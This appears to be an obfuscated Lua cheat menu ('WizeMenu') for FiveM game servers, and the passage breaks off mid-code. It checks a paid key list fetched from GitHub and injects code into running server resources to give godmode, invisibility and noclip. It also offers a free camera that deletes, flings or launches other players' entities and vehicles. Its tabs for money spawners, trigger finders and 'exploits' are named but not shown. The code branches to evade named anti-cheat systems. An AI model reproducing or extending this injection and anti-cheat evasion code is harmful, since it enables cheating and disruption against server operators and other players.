
local v0="https://raw.githubusercontent.com/WM5M/564756558758547545475566858754hnfvngfjhgvgjfjghfffjfgffjgj/refs/heads/main/wzmkeys.json";local v1=MachoWebRequest(v0);local v2=MachoAuthenticationKey();local v3=true;local function v4() local v77=0 -0 ;local v78;while true do if (v77==0) then v78=GetCloudTimeAsInt();return ((v78>(0 -0)) and v78) or (0 -0) ;end end end local function v5(v79) local v80=0 + 0 ;local v81;local v82;local v83;local v84;local v85;local v86;local v87;while true do if (v80==1) then if  not v81 then return nil;end v87=((tonumber(v81) -(3759 -1789)) * (1085 -720)) + math.floor((tonumber(v81) -1969)/(4 + 0) ) + ((tonumber(v82) -(1 + 0)) * (14 + 16)) + tonumber(v83) ;v80=4 -2 ;end if (v80==(2 + 0)) then return (v87 * 86400) + (tonumber(v84) * 3600) + (tonumber(v85) * (1227 -(645 + 522))) + tonumber(v86) ;end if (v80==(1790 -(1010 + 780))) then if (type(v79)~="string") then return nil;end v81,v82,v83,v84,v85,v86=string.match(v79,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");v80=1 + 0 ;end end end local function v6() local v88=0 -0 ;local v89;local v90;local v91;while true do if (v88==(5 -3)) then for v321,v322 in ipairs(v90) do if ((type(v322)=="table") and (v322.key==v2)) then if (v322.expires and (type(v322.expires)=="string")) then local v420=1836 -(1045 + 791) ;local v421;while true do if ((0 -0)==v420) then v421=v5(v322.expires);if  not v421 then return false,"Bad expiry format";end v420=1;end if (1==v420) then if (v421>v91) then return true,"Key valid (not expired)",v421;else return false,"Key expired",v421;end break;end end elseif v3 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end if (v88==1) then if ( not v89 or  not v90 or (type(v90)~="table")) then return false,"Key list invalid";end v91=v4();v88=2 -0 ;end if (v88==(505 -(351 + 154))) then if  not v1 then return false,"No key list available";end v89,v90=pcall(json.decode,v1);v88=1;end end end local v7,v8,v9=v6();if  not v7 then local v269=0;while true do if (v269==0) then MachoMenuNotification("WizeMenu","Your key ain't valid lmfao: "   .. v2   .. " ("   .. v8   .. ")" ,10);return;end end end Citizen.CreateThread(function() if (v9 and (v9>0)) then local v282=v4();local v283=v9-v282 ;if (v283>(1574 -(1281 + 293))) then local v323=0;local v324;local v325;local v326;while true do if (v323==1) then v326=string.format("Your key is valid. Expires in %d days and %d hours.",v324,v325);MachoMenuNotification("WizeMenu",v326,271 -(28 + 238) );break;end if (v323==(0 -0)) then v324=math.floor(v283/86400 );v325=math.floor((v283%(87959 -(1381 + 178)))/(3377 + 223) );v323=1 + 0 ;end end else MachoMenuNotification("WizeMenu","Key expired.",5 + 5 );end else MachoMenuNotification("WizeMenu","Key valid (no expiry field).",5);end end);local v10=vec2(2585 -1835 ,500);local v11=vec2(260 + 240 ,970 -(381 + 89) );local v12=134 + 16 ;local v13=10;local v14=15;local v15=v10.x-v12 ;local v16=v10.y-((2 + 0) * v13) ;local v17=(v15-(v13 * (4 -1)))/(1158 -(1074 + 82)) ;local v18=(v16-(v13 * (6 -3)))/(1786 -(214 + 1570)) ;local v19=MachoMenuTabbedWindow("WizeVIP",v11.x,v11.y,v10.x,v10.y,v12);MachoMenuSetKeybind(v19,1488 -(990 + 465) );MachoMenuSetAccent(v19,207,16,32);MachoMenuText(v19,"YT @JayThaaGamer");local v20=MachoMenuAddTab(v19,"Self");local v21=MachoMenuAddTab(v19,"Server");local v22=MachoMenuAddTab(v19,"Teleport");local v23=MachoMenuAddTab(v19,"Weapon");local v24=MachoMenuAddTab(v19,"Vehicle");local v25=MachoMenuAddTab(v19,"Animations");local v26=MachoMenuAddTab(v19,"Triggers");local v27=MachoMenuAddTab(v19,"Settings");local v28=MachoMenuAddTab(v19,"VIP");local function v29(v92) local v93=0 + 0 ;local v94;local v95;local v96;local v97;local v98;local v99;local v100;local v101;while true do if ((1 + 1)==v93) then v98=(v18 * (2 + 0)) + v13 ;v99=MachoMenuGroup(v92,"Self",v94,v95,v94 + v17 ,v95 + v98 );v93=11 -8 ;end if (v93==0) then v94=v12 + v13 ;v95=v13 + v14 ;v93=1727 -(1668 + 58) ;end if (v93==1) then v96=v95 + v18 + v13 ;v97=v94 + v17 + v13 ;v93=628 -(512 + 114) ;end if (v93==(7 -4)) then v100=MachoMenuGroup(v92,"Model Changer",v97,v95,v97 + v17 ,v95 + v18 );v101=MachoMenuGroup(v92,"Functions",v97,v96,v97 + v17 ,v96 + v18 );v93=8 -4 ;end if (4==v93) then return v99,v100,v101;end end end local function v30(v102) local v103=0;local v104;local v105;local v106;local v107;local v108;local v109;local v110;while true do if ((3 -2)==v103) then v106=v105 + v104 ;v107=MachoMenuGroup(v102,"Server Players",v105,v13 + v14 ,v106,v16);v103=2;end if (v103==(1 + 1)) then v108=v106 + v13 ;v109=v108 + v104 ;v103=1 + 2 ;end if (v103==(3 + 0)) then v110=MachoMenuGroup(v102,"Server Players 2",v108,v13 + v14 ,v109,v16);return v107,v110;end if (v103==0) then v104=(v15-(v13 * 3))/2 ;v105=v12 + v13 ;v103=3 -2 ;end end end local function v31(v111) local v112=1994 -(109 + 1885) ;local v113;local v114;local v115;local v116;local v117;local v118;local v119;while true do if (v112==(1470 -(1269 + 200))) then v115=v114 + v113 ;v116=MachoMenuGroup(v111,"Teleport",v114,v13 + v14 ,v115,v16);v112=2;end if ((0 -0)==v112) then v113=(v15-(v13 * (818 -(98 + 717))))/(828 -(802 + 24)) ;v114=v12 + v13 ;v112=1 -0 ;end if (v112==2) then v117=v115 + v13 ;v118=v117 + v113 ;v112=3 -0 ;end if (v112==(1 + 2)) then v119=MachoMenuGroup(v111,"Other",v117,v13 + v14 ,v118,v16);return v116,v119;end end end local function v32(v120) local v121=0 + 0 ;local v122;local v123;local v124;local v125;local v126;local v127;local v128;while true do if (v121==(0 + 0)) then v122=v12 + v13 ;v123=v13 + v14 ;v121=1 + 0 ;end if ((2 -1)==v121) then v124=v123 + v18 + v13 ;v125=MachoMenuGroup(v120,"Mods",v122,v123,v122 + v17 ,v123 + v18 );v121=2;end if (v121==(6 -4)) then v126=MachoMenuGroup(v120,"Weapon Spawner [All+Ammo]",v122,v124,v122 + v17 ,v124 + v18 );v127=v122 + v17 + v13 ;v121=3;end if (v121==3) then v128=MachoMenuGroup(v120,"Other",v127,v13 + v14 ,v127 + v17 ,v16);return v125,v126,v128;end end end local function v33(v129) local v130=0 + 0 ;local v131;local v132;local v133;local v134;local v135;local v136;local v137;while true do if (v130==3) then v137=MachoMenuGroup(v129,"Other",v136,v13 + v14 ,v136 + v17 ,v16);return v134,v135,v137;end if (0==v130) then v131=v12 + v13 ;v132=v13 + v14 ;v130=1 + 0 ;end if (v130==1) then v133=v132 + v18 + v13 ;v134=MachoMenuGroup(v129,"Mods",v131,v132,v131 + v17 ,v132 + v18 );v130=2 + 0 ;end if (v130==(2 + 0)) then v135=MachoMenuGroup(v129,"Plate & Spawning",v131,v133,v131 + v17 ,v133 + v18 );v136=v131 + v17 + v13 ;v130=2 + 1 ;end end end local function v34(v138) local v139=0;local v140;local v141;local v142;local v143;local v144;local v145;local v146;while true do if (v139==3) then v146=MachoMenuGroup(v138,"Force Emotes",v144,v13 + v14 ,v145,v16);return v143,v146;end if (v139==(1435 -(797 + 636))) then v144=v142 + v13 ;v145=v144 + v140 ;v139=3;end if (v139==0) then v140=(v15-(v13 * (14 -11)))/2 ;v141=v12 + v13 ;v139=1;end if (v139==(1620 -(1427 + 192))) then v142=v141 + v140 ;v143=MachoMenuGroup(v138,"Animations",v141,v13 + v14 ,v142,v16);v139=1 + 1 ;end end end local function v35(v147) local v148=0;local v149;local v150;local v151;local v152;local v153;local v154;local v155;local v156;while true do if (v148==(8 -4)) then return v152,v153,v155,v156;end if (v148==(0 + 0)) then v149=v12 + v13 ;v150=v13 + v14 ;v148=1;end if (v148==(1 + 1)) then v153=MachoMenuGroup(v147,"Money Spawner",v149,v150,v149 + v17 ,v150 + v18 );v154=v149 + v17 + v13 ;v148=329 -(192 + 134) ;end if (v148==(1279 -(316 + 960))) then v155=MachoMenuGroup(v147,"Common Exploits",v154,v150,v154 + v17 ,v150 + v18 );v156=MachoMenuGroup(v147,"Event Payloads",v154,v151,v154 + v17 ,v151 + v18 );v148=4;end if (v148==(1 + 0)) then v151=v150 + v18 + v13 ;v152=MachoMenuGroup(v147,"Item Spawner",v149,v151,v149 + v17 ,v150 + v18 );v148=2;end end end local function v36(v157) local v158=0 + 0 ;local v159;local v160;local v161;local v162;local v163;local v164;local v165;while true do if (v158==1) then v161=v160 + v18 + v13 ;v162=MachoMenuGroup(v157,"Trigger Finder Spawner",v159,v160,v159 + v17 ,v160 + v18 );v158=2 + 0 ;end if (v158==(11 -8)) then v165=MachoMenuGroup(v157,"Common Exploits V2",v164,v13 + v14 ,v164 + v17 ,v16);return v162,v163,v165;end if (v158==(551 -(83 + 468))) then v159=v12 + v13 ;v160=v13 + v14 ;v158=1;end if (v158==(1808 -(1202 + 604))) then v163=MachoMenuGroup(v157,"Common Exploits",v159,v161,v159 + v17 ,v161 + v18 );v164=v159 + v17 + v13 ;v158=3;end end end local function v37(v166) local v167=0 -0 ;local v168;local v169;local v170;local v171;local v172;local v173;local v174;while true do if (v167==3) then v174=MachoMenuGroup(v166,"Server Settings",v173,v13 + v14 ,v173 + v17 ,v16);return v171,v172,v174;end if (v167==(1 -0)) then v170=v169 + v18 + v13 ;v171=MachoMenuGroup(v166,"Stop",v168,v169,v168 + v17 ,v169 + v18 );v167=5 -3 ;end if (v167==(325 -(45 + 280))) then v168=v12 + v13 ;v169=v13 + v14 ;v167=1;end if (v167==2) then v172=MachoMenuGroup(v166,"Menu Design",v168,v170,v168 + v17 ,v170 + v18 );v173=v168 + v17 + v13 ;v167=3;end end end local v38={v29(v20)};local v39={v30(v21)};local v40={v31(v22)};local v41={v32(v23)};local v42={v33(v24)};local v43={v34(v25)};local v44={v35(v26)};local v45={v36(v28)};local v46={v37(v27)};local function v47(v175) return GetResourceState(v175)=="started" ;end local function v48() local v176=0;while true do if (1==v176) then Wait(500);MachoMenuNotification("[NOTIFICATION] WizeMenu","Almost there!.");break;end if (v176==(0 -0)) then Wait(3411 -(340 + 1571) );MachoMenuNotification("[NOTIFICATION] WizeMenu","Starting.");v176=1;end end end Citizen.CreateThread(function() local v177=0 + 0 ;while true do if ((1772 -(1733 + 39))==v177) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Finished!");Wait(1373 -873 );v177=1035 -(125 + 909) ;end if ((1949 -(1096 + 852))==v177) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Wize On Top!!");break;end end end);MachoMenuCheckbox(v38[1 + 0 ],"Godmode",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if aXfPlMnQwErTyUi == nil then aXfPlMnQwErTyUi = false end
                aXfPlMnQwErTyUi = true

                local function OxWJ1rY9vB()
                    local fLdRtYpLoWqEzXv = CreateThread
                    fLdRtYpLoWqEzXv(function()
                        while aXfPlMnQwErTyUi and not Unloaded do
                            local dOlNxGzPbTcQ = PlayerPedId()
                            local rKsEyHqBmUiW = PlayerId()

                            if GetResourceState("ReaperV4") == "started" then
                                local kcWsWhJpCwLI = SetPlayerInvincible
                                local ByTqMvSnAzXd = SetEntityInvincible
                                kcWsWhJpCwLI(rKsEyHqBmUiW, true)
                                ByTqMvSnAzXd(dOlNxGzPbTcQ, true)

                            elseif GetResourceState("WaveShield") == "started" then
                                local cvYkmZYIjvQQ = SetEntityCanBeDamaged
                                cvYkmZYIjvQQ(dOlNxGzPbTcQ, false)

                            else
                                local BiIqUJHexRrR = SetEntityCanBeDamaged
                                local UtgGRNyiPhOs = SetEntityProofs
                                local rVuKoDwLsXpC = SetEntityInvincible

                                BiIqUJHexRrR(dOlNxGzPbTcQ, false)
                                UtgGRNyiPhOs(dOlNxGzPbTcQ, true, true, true, false, true, false, false, false)
                                rVuKoDwLsXpC(dOlNxGzPbTcQ, true)
                            end

                            Wait(0)
                        end
                    end)
                end

                OxWJ1rY9vB()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                aXfPlMnQwErTyUi = false

                local dOlNxGzPbTcQ = PlayerPedId()
                local rKsEyHqBmUiW = PlayerId()

                if GetResourceState("ReaperV4") == "started" then
                    local kcWsWhJpCwLI = SetPlayerInvincible
                    local ByTqMvSnAzXd = SetEntityInvincible

                    kcWsWhJpCwLI(rKsEyHqBmUiW, false)
                    ByTqMvSnAzXd(dOlNxGzPbTcQ, false)

                elseif GetResourceState("WaveShield") == "started" then
                    local AilJsyZTXnNc = SetEntityCanBeDamaged
                    AilJsyZTXnNc(dOlNxGzPbTcQ, true)

                else
                    local tBVAZMubUXmO = SetEntityCanBeDamaged
                    local yuTiZtxOXVnE = SetEntityProofs
                    local rVuKoDwLsXpC = SetEntityInvincible

                    tBVAZMubUXmO(dOlNxGzPbTcQ, true)
                    yuTiZtxOXVnE(dOlNxGzPbTcQ, false, false, false, false, false, false, false, false)
                    rVuKoDwLsXpC(dOlNxGzPbTcQ, false)
                end
            ]]);end);MachoMenuCheckbox(v38[1 -0 ],"Invisibility",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
                sRtYuIoPaSdFgHj = true

                local function d2NcWoyTfb()
                    if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
                    sRtYuIoPaSdFgHj = true

                    local zXwCeVrBtNuMyLk = CreateThread
                    zXwCeVrBtNuMyLk(function()
                        while sRtYuIoPaSdFgHj and not Unloaded do
                            local uYiTpLaNmZxCwEq = SetEntityVisible
                            local hGfDrEsWxQaZcVb = PlayerPedId()
                            uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, false, false)
                            Wait(0)
                        end

                        local uYiTpLaNmZxCwEq = SetEntityVisible
                        local hGfDrEsWxQaZcVb = PlayerPedId()
                        uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
                    end)
                end

                d2NcWoyTfb()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                sRtYuIoPaSdFgHj = false

                local function tBKM4syGJL()
                    local uYiTpLaNmZxCwEq = SetEntityVisible
                    local hGfDrEsWxQaZcVb = PlayerPedId()
                    uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
                end

                tBKM4syGJL()
            ]]);end);MachoMenuCheckbox(v38[1],"No Ragdoll",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if mKjHgFdSaPlMnBv == nil then mKjHgFdSaPlMnBv = false end
                mKjHgFdSaPlMnBv = true

                local function jP7xUrK9Ao()
                    local zVpLyNrTmQxWsEd = CreateThread
                    zVpLyNrTmQxWsEd(function()
                        while mKjHgFdSaPlMnBv and not Unloaded do
                            local oPaSdFgHiJkLzXc = SetPedCanRagdoll
                            oPaSdFgHiJkLzXc(PlayerPedId(), false)
                            Wait(0)
                        end
                    end)
                end

                jP7xUrK9Ao()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                mKjHgFdSaPlMnBv = false
            ]]);end);MachoMenuCheckbox(v38[1],"Infinite Stamina",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if uYtReWqAzXcVbNm == nil then uYtReWqAzXcVbNm = false end
                uYtReWqAzXcVbNm = true

                local function YLvd3pM0tB()
                    local tJrGyHnMuQwSaZx = CreateThread
                    tJrGyHnMuQwSaZx(function()
                        while uYtReWqAzXcVbNm and not Unloaded do
                            local aSdFgHjKlQwErTy = RestorePlayerStamina
                            local rTyUiEaOpAsDfGhJk = PlayerId()
                            aSdFgHjKlQwErTy(rTyUiEaOpAsDfGhJk, 1.0)
                            Wait(0)
                        end
                    end)
                end

                YLvd3pM0tB()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                uYtReWqAzXcVbNm = false
            ]]);end);MachoMenuCheckbox(v38[1 + 0 ],"Tiny Ped",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if peqCrVzHDwfkraYZ == nil then peqCrVzHDwfkraYZ = false end
                peqCrVzHDwfkraYZ = true

                local function YfeemkaufrQjXTFY()
                    local OLZACovzmAvgWPmC = CreateThread
                    OLZACovzmAvgWPmC(function()
                        while peqCrVzHDwfkraYZ and not Unloaded do
                            local aukLdkvEinBsMWuA = SetPedConfigFlag
                            aukLdkvEinBsMWuA(PlayerPedId(), 223, true)
                            Wait(0)
                        end
                    end)
                end

                YfeemkaufrQjXTFY()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                peqCrVzHDwfkraYZ = false
                local aukLdkvEinBsMWuA = SetPedConfigFlag
                aukLdkvEinBsMWuA(PlayerPedId(), 223, false)
            ]]);end);MachoMenuCheckbox(v38[513 -(409 + 103) ],"No Clip",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if NpYgTbUcXsRoVm == nil then NpYgTbUcXsRoVm = false end
                NpYgTbUcXsRoVm = true

                local function KUQpH7owdz()
                    local RvBcNxMzKgUiLo = PlayerPedId
                    local EkLpOiUhYtGrFe = GetVehiclePedIsIn
                    local CtVbXnMzQaWsEd = GetEntityCoords
                    local DrTgYhUjIkOlPm = GetEntityHeading
                    local QiWzExRdCtVbNm = GetGameplayCamRelativeHeading
                    local AoSdFgHjKlZxCv = GetGameplayCamRelativePitch
                    local JkLzXcVbNmAsDf = IsDisabledControlJustPressed
                    local TyUiOpAsDfGhJk = IsDisabledControlPressed
                    local WqErTyUiOpAsDf = SetEntityCoordsNoOffset
                    local PlMnBvCxZaSdFg = SetEntityHeading
                    local HnJmKlPoIuYtRe = CreateThread

                    local YtReWqAzXsEdCv = false

                    HnJmKlPoIuYtRe(function()
                        while NpYgTbUcXsRoVm and not Unloaded do
                            Wait(0)

                            if JkLzXcVbNmAsDf(0, 303) then
                                YtReWqAzXsEdCv = not YtReWqAzXsEdCv
                            end

                            if YtReWqAzXsEdCv then
                                local speed = 2.0

                                local p = RvBcNxMzKgUiLo()
                                local v = EkLpOiUhYtGrFe(p, false)
                                local inVeh = v ~= 0 and v ~= nil
                                local ent = inVeh and v or p

                                local pos = CtVbXnMzQaWsEd(ent, true)
                                local head = QiWzExRdCtVbNm() + DrTgYhUjIkOlPm(ent)
                                local pitch = AoSdFgHjKlZxCv()

                                local dx = -math.sin(math.rad(head))
                                local dy = math.cos(math.rad(head))
                                local dz = math.sin(math.rad(pitch))
                                local len = math.sqrt(dx * dx + dy * dy + dz * dz)

                                if len ~= 0 then
                                    dx, dy, dz = dx / len, dy / len, dz / len
                                end

                                if TyUiOpAsDfGhJk(0, 21) then speed = speed + 2.5 end
                                if TyUiOpAsDfGhJk(0, 19) then speed = 0.25 end

                                if TyUiOpAsDfGhJk(0, 32) then
                                    pos = pos + vector3(dx, dy, dz) * speed
                                end
                                if TyUiOpAsDfGhJk(0, 34) then
                                    pos = pos + vector3(-dy, dx, 0.0) * speed
                                end
                                if TyUiOpAsDfGhJk(0, 269) then
                                    pos = pos - vector3(dx, dy, dz) * speed
                                end
                                if TyUiOpAsDfGhJk(0, 9) then
                                    pos = pos + vector3(dy, -dx, 0.0) * speed
                                end
                                if TyUiOpAsDfGhJk(0, 22) then
                                    pos = pos + vector3(0.0, 0.0, speed)
                                end
                                if TyUiOpAsDfGhJk(0, 36) then
                                    pos = pos - vector3(0.0, 0.0, speed)
                                end

                                WqErTyUiOpAsDf(ent, pos.x, pos.y, pos.z, true, true, true)
                                PlMnBvCxZaSdFg(ent, head)
                            end
                        end
                        YtReWqAzXsEdCv = false
                    end)
                end

                KUQpH7owdz()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                NpYgTbUcXsRoVm = false
            ]]);end);MachoMenuCheckbox(v38[237 -(46 + 190) ],"Free Camera",function() MachoInjectResource((v47("core") and "core") or (v47("es_extended") and "es_extended") or (v47("qb-core") and "qb-core") or (v47("monitor") and "monitor") or "any" ,[[
                
                g_FreecamFeatureEnabled = true
                
                local function initializeFreecam()
                    -- Script State
                    local isFreecamActive = false
                    local freecamHandle = nil
                    local targetCoords, targetEntity = nil, nil
                    local currentFeatureIndex = 1

                    -- NEW FEATURE: Ped Spawning State
                    local pedsToSpawn = { "s_m_m_movalien_01", "u_m_y_zombie_01", "s_m_y_blackops_01", "csb_abigail", "a_c_coyote" }
                    local currentPedIndex = 1

                    local stopFreecam, startFreecam

                    -- Feature Definitions (Now with Ped Spawner)
                    local Features = { 
                        "Look-Around", 
                        "Spawn Ped",         -- ADDED
                        "Teleport", 
                        "Delete Entity", 
                        "Fling Entity", 
                        "Flip Vehicle", 
                        "Launch Vehicle",
                        "Teleport Vehicle",
                        "Mess With Vehicle"
                    }

                    -- Helper Function for Drawing Text
                    local function drawText(content, x, y, options)
                        SetTextFont(options.font or 4)
                        SetTextScale(0.0, options.scale or 0.3)
                        SetTextColour(options.color[1], options.color[2], options.color[3], options.color[4])
                        SetTextOutline()
                        if options.shadow then SetTextDropShadow(2, 0, 0, 0, 255) end
                        SetTextCentre(true)
                        BeginTextCommandDisplayText("STRING")
                        AddTextComponentSubstringPlayerName(content)
                        EndTextCommandDisplayText(x, y)
                    end

                    -- Main Draw Thread (UI Only)
                    local function drawThread()
                        while isFreecamActive do
                            Wait(0)
                            -- Draw Crosshair
                            drawText("•", 0.5, 0.485, {font = 4, scale = 0.5, color = {255,255,255,200}})
                            
                            -- ##### UI FIX: SCROLLING MENU LOGIC #####
                            local ui = { x = 0.5, y = 0.75, lineHeight = 0.03, maxVisible = 7, colors = { text = {245, 245, 245, 120}, selected = {52, 152, 219, 255} } }
                            local numFeatures = #Features
                            local startIdx, endIdx = 1, numFeatures

                            if numFeatures > ui.maxVisible then
                                startIdx = math.max(1, currentFeatureIndex - math.floor(ui.maxVisible / 2))
                                endIdx = math.min(numFeatures, startIdx + ui.maxVisible - 1)
                                if endIdx == numFeatures then
                                    startIdx = numFeatures - ui.maxVisible + 1
                                end
                            end

                            -- Draw a counter above the list
                            drawText(("%d/%d"):format(currentFeatureIndex, numFeatures), ui.x, ui.y - 0.035, {scale = 0.25, color = {255,255,255,120}})

                            local displayCount = 0
                            for i = startIdx, endIdx do
                                local featureName = Features[i]
                                local isSelected = (i == currentFeatureIndex)
                                local lineY = ui.y + (displayCount * ui.lineHeight)
                                if isSelected then
                                    drawText(("[ %s ]"):format(featureName), ui.x, lineY, {scale = 0.32, color = ui.colors.selected, shadow = true})
                                else
                                    drawText(featureName, ui.x, lineY, {scale = 0.28, color = ui.colors.text})
                                end
                                displayCount = displayCount + 1
                            end
                        end
                    end

                    -- Main Input and Logic Thread
                    local function logicThread()
                        while isFreecamActive do
                            Wait(0)
                            if IsDisabledControlJustPressed(0, 241) then currentFeatureIndex = (currentFeatureIndex - 2 + #Features) % #Features + 1 elseif IsDisabledControlJustPressed(0, 242) then currentFeatureIndex = (currentFeatureIndex % #Features) + 1 end
                            
                            if IsDisabledControlJustPressed(0, 24) then -- Action Key Pressed
                                local currentFeature = Features[currentFeatureIndex]
                                if currentFeature == "Teleport" and targetCoords then
                                    local ped = PlayerPedId()
                                    local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false)
                                    SetEntityCoords(ped, targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z, false, false, false, true)
                                -- ##### NEW FEATURE: SAFE PED SPAWNER LOGIC #####
                                elseif currentFeature == "Spawn Ped" and targetCoords then
                                    local model = pedsToSpawn[currentPedIndex]
                                    CreateThread(function()
                                        local modelHash = GetHashKey(model)
                                        RequestModel(modelHash)
                                        local timeout = 2000 -- 2 second timeout for model loading
                                        while not HasModelLoaded(modelHash) and timeout > 0 do
                                            Wait(100)
                                            timeout = timeout - 100
                                        end
                                        if HasModelLoaded(modelHash) then
                                            local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z, false)
                                            local spawnPos = vector3(targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z)
                                            local newPed = CreatePed(4, modelHash, spawnPos.x, spawnPos.y, spawnPos.z, 0.0, true, true)
                                            SetModelAsNoLongerNeeded(modelHash)
                                            TaskStandStill(newPed, -1) -- Make them stand still
                                            currentPedIndex = (currentPedIndex % #pedsToSpawn) + 1 -- Cycle to the next ped for next time
                                        end
                                    end)
                                elseif currentFeature == "Delete Entity" and targetEntity and DoesEntityExist(targetEntity) then
                                    SetEntityAsMissionEntity(targetEntity, true, true)
                                    DeleteEntity(targetEntity)
                                elseif currentFeature == "Fling Entity" and targetEntity and (IsEntityAPed(targetEntity) or IsEntityAVehicle(targetEntity)) then
                                    ApplyForceToEntity(targetEntity, 1, math.random(-50.0, 50.0), math.random(-50.0, 50.0), 50.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                elseif currentFeature == "Flip Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                    SetVehicleOnGroundProperly(targetEntity)
                                elseif currentFeature == "Launch Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                    ApplyForceToEntity(targetEntity, 1, 0.0, 0.0, 100.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                elseif currentFeature == "Teleport Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                    local currentCoords = GetEntityCoords(targetEntity)
                                    local newCoords = currentCoords + GetEntityForwardVector(targetEntity) * 5.0 + vector3(0.0, 0.0, 50.0)
                                    SetEntityCoords(targetEntity, newCoords.x, newCoords.y, newCoords.z, false, false, false, true)
                                elseif currentFeature == "Mess With Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                                    local actions = {
                                        function(veh) SetVehicleTyreBurst(veh, math.random(0, 5), false, 1000.0) end,
                                        function(veh) SetVehicleDoorOpen(veh, math.random(0, 5), false, false) end,
                                        function(veh) SetVehicleEngineOn(veh, not IsVehicleEngineOn(veh), false, true) end,
                                        function(veh) SetVehicleLights(veh, math.random(0, 2)) end,
                                        function(veh) StartVehicleHorn(veh, 1000, "HELDDOWN", false) end
                                    }
                                    local randomAction = actions[math.random(#actions)]
                                    randomAction(targetEntity)
                                end
                            end
                        end
                    end

                    -- Main Camera Movement Thread (Unchanged)
                    local function cameraThread()
                        local baseSpeed, boostSpeed, slowSpeed = 1.0, 9.0, 0.1; local mouseSensitivity = 7.5; local function clamp(val, min, max) return math.max(min, math.min(max, val)) end; local function rotToDir(rot) local rX, rZ = math.rad(rot.x), math.rad(rot.z); return vector3(-math.sin(rZ)*math.cos(rX), math.cos(rZ)*math.cos(rX), math.sin(rX)) end;
                        while isFreecamActive do
                            Wait(0)
                            local camPos, camRotRaw = GetCamCoord(freecamHandle), GetCamRot(freecamHandle, 2); local camRot = { x = camRotRaw.x, y = camRotRaw.y, z = camRotRaw.z }; local direction = rotToDir(camRot); local right = vector3(direction.y, -direction.x, 0)
                            local speed = baseSpeed; if IsDisabledControlPressed(0, 21) then speed = boostSpeed end; if IsDisabledControlPressed(0, 19) then speed = slowSpeed end
                            if IsDisabledControlPressed(0, 32) then camPos = camPos + direction * speed end; if IsDisabledControlPressed(0, 33) then camPos = camPos - direction * speed end; if IsDisabledControlPressed(0, 34) then camPos = camPos - right * speed end; if IsDisabledControlPressed(0, 35) then camPos = camPos + right * speed end; if IsDisabledControlPressed(0, 22) then camPos = camPos + vector3(0, 0, 1.0) * speed end; if IsDisabledControlPressed(0, 36) then camPos = camPos - vector3(0, 0, 1.0) * speed end
                            local mX, mY = GetControlNormal(0,1)*mouseSensitivity, GetControlNormal(0,2)*mouseSensitivity; camRot.x = clamp(camRot.x-mY, -89.0, 89.0); camRot.z = camRot.z-mX
                            SetCamCoord(freecamHandle, camPos.x, camPos.y, camPos.z); SetCamRot(freecamHandle, camRot.x, camRot.y, camRot.z, 2); SetFocusPosAndVel(camPos.x, camPos.y, camPos.z, 0.0, 0.0, 0.0)
                            local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, camPos.x+direction.x*1000.0, camPos.y+direction.y*1000.0, camPos.z+direction.z*1000.0, -1, PlayerPedId(), 7); local _, hit, coords, _, entity = GetShapeTestResult(ray); if hit then targetCoords, targetEntity = coords, entity else targetCoords, targetEntity = nil, nil end
                        end
                    end
                    
                    startFreecam = function()
                        if isFreecamActive then return end
                        isFreecamActive = true
                        local startPos, startRot, startFov = GetGameplayCamCoord(), GetGameplayCamRot(2), GetGameplayCamFov()
                        freecamHandle = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", startPos.x, startPos.y, startPos.z, startRot.x, startRot.y, startRot.z, startFov, true, 2)
                        
                        if not DoesCamExist(freecamHandle) then isFreecamActive = false; return end

                        RenderScriptCams(true, false, 0, true, true)
                        SetCamActive(freecamHandle, true)
                        CreateThread(drawThread)
                        CreateThread(logicThread)
                        CreateThread(cameraThread)
                    end

                    stopFreecam = function()
                        if not isFreecamActive then return end
                        isFreecamActive = false
                        if freecamHandle and DoesCamExist(freecamHandle) then SetCamActive(freecamHandle, false); RenderScriptCams(false, false, 0, true, true); DestroyCam(freecamHandle, false) end
                        Wait(10); SetFocusEntity(PlayerPedId()); ClearFocus()
                        freecamHandle = nil
                    end
                    
                    CreateThread(function()
